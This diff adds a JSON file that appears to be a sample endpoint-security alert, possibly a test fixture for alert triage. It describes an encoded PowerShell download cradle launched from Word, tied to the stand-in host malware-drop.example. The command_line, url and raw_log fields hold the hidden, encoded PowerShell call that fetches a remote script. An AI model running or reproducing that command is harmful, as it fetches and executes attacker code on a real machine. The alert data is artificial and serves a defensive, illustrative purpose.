@@ -1,0 +1,20 @@
+{
+  "alert_id": "ALRT-2026-0002",
+  "alert_name": "Encoded PowerShell Execution",
+  "severity": "high",
+  "source_tool": "Microsoft Defender for Endpoint",
+  "detection_name": "Suspicious PowerShell - Encoded Command",
+  "detection_id": "PS-007",
+  "event_time": "2026-06-12T11:45:00Z",
+  "source_host": "WKS-1042",
+  "destination_host": "malware-drop.example",
+  "username": "arossi",
+  "process_name": "powershell.exe",
+  "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQ",
+  "url": "http://malware-drop.example/p.ps1",
+  "domain": "malware-drop.example",
+  "asset_criticality": "medium",
+  "business_impact": "Potential endpoint compromise of an HR workstation.",
+  "analyst_notes": "Parent process was winword.exe — possible phishing macro.",
+  "raw_log": "2026-06-12T11:45:00Z host=WKS-1042 user=arossi parent=winword.exe process=powershell.exe cmd=\"powershell.exe -nop -w hidden -enc SQBFAFgAKAB...\" outcome=success"
+}
